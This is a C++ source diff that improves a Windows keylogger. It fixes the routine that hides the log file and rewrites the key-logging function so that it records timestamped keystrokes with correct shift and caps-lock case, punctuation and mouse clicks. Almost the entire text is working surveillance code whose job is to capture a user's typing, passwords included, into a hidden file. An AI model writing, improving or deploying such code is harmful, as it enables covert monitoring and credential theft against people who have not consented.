@@ -2,7 +2,8 @@
 #include <iostream>
 #include <thread> // For sleep
 #include <windows.h> // Key press detection on windows
-
+#include <ctime> // For time
+#include <iomanip> // For time
 
 KeyLogger::KeyLogger(const std::string& filePath) : logFile(filePath)
 {
@@ -35,7 +36,7 @@ void KeyLogger::makeFileHidden()
     
     // Set the file to hidden
     DWORD at = GetFileAttributesW(wideLogFile.c_str());
-    if(at != INVALID_FILE_ATTRIBUTES && !(at && FILE_ATTRIBUTE_DIRECTORY))
+    if(at != INVALID_FILE_ATTRIBUTES && !(at & FILE_ATTRIBUTE_DIRECTORY))
     {
         // Make hidden
         SetFileAttributesW(wideLogFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
@@ -44,30 +45,120 @@ void KeyLogger::makeFileHidden()
 
 void KeyLogger::logKey(int key)
 {
-    // Get timestamp
+    // Get time and duration
     auto lastPressTime = lastKeyPress[key];
     auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(lastPressTime.time_since_epoch()).count();
+    auto now = std::chrono::system_clock::now();
+    auto nowTimeT = std::chrono::system_clock::to_time_t(now);
+    auto nowMs = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
 
-    // Convert key to string
-    std::string keyStr = std::to_string(key);
+    // Format the time 
+    std::ostringstream timestamp;
+    timestamp << std::put_time(std::localtime(&nowTimeT), "%Y-%m-%d %H:%M:%S")
+              << '.' << std::setfill('0') << std::setw(3) << nowMs.count();
 
-    if(key >= 32 && key <= 126)
+    std::string keyString;
+
+    // Check for uppercase or lowercase
+    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+    bool isUppercase = shiftPressed ^ capsLockOn; // XOR because they invert each other
+
+    // Handle printable characters
+    if (key > 32 && key <= 126)
     {
-        // Printable ascii chars
-        keyStr = static_cast<char>(key);
-        if (loggingFile.is_open()) 
+        if (std::isalpha(key)) // Alphabet characters
         {
-            // Log the key along with the timestamp from lastKeyPress
-            loggingFile << duration << "\t" << keyStr << std::endl;
+            keyString = isUppercase ? std::toupper(static_cast<char>(key)) : std::tolower(static_cast<char>(key));
         }
-        else 
+        else if (std::isdigit(key)) // Digits with possible shift modifications
         {
-            // In case the file is not open
-            std::cerr << "Error: Unable to write to log file!" << std::endl;
+            if (isUppercase)
+            {
+                std::string special = "!@#$%^&*()";
+                keyString = (key - '0' == 0) ? special[9] : special[(key - '0') - 1];
+            }
+            else
+            {
+                keyString = static_cast<char>(key);
+            }
+        }
+        else // Other printable characters
+        {
+            keyString = static_cast<char>(key);
         }
     }
-    
+    else
+    {
+        // Handle special keys and punctuation with a switch statement
+        switch (key)
+        {
+        case VK_OEM_COMMA:
+            keyString = isUppercase ? "<" : ",";
+            break;
+        case VK_OEM_PERIOD:
+            keyString = isUppercase ? ">" : ".";
+            break;
+        case VK_OEM_MINUS:
+            keyString = isUppercase ? "_" : "-";
+            break;
+        case VK_OEM_PLUS:
+            keyString = isUppercase ? "+" : "=";
+            break;
+        case VK_OEM_1: 
+            keyString = isUppercase ? ":" : ";";
+            break;
+        case VK_OEM_2: 
+            keyString = isUppercase ? "?" : "/";
+            break;
+        case VK_OEM_3: 
+            keyString = isUppercase ? "~" : "`";
+            break;
+        case VK_OEM_4:
+            keyString = isUppercase ? "{" : "[";
+            break;
+        case VK_OEM_5: 
+            keyString = isUppercase ? "|" : "\\";
+            break;
+        case VK_OEM_6: 
+            keyString = isUppercase ? "}" : "]";
+            break;
+        case VK_OEM_7: 
+            keyString = isUppercase ? "\"" : "'";
+            break;
+        case VK_SPACE:
+            keyString = "[SPACE]";
+            break;
+        case VK_BACK:
+            keyString = "[BACKSPACE]";
+            break;
+        case VK_SHIFT:
+            keyString = "[SHIFT]";
+            break;
+        case 1: 
+            keyString = "[MOUSE1]";
+            break;
+        case 2: 
+            keyString = "[MOUSE2]";
+            break;
+        }
+    }
+
+    // Log the key
+    if (loggingFile.is_open())
+    {
+        if (!keyString.empty()) // Check for non-empty keys
+        {
+            loggingFile << timestamp.str() << "     " << keyString << std::endl;
+        }
+    }
+    else
+    {
+        std::cerr << "Logging file isn't open" << std::endl;
+    }
 }
+
+
 
 void KeyLogger::run()
 {
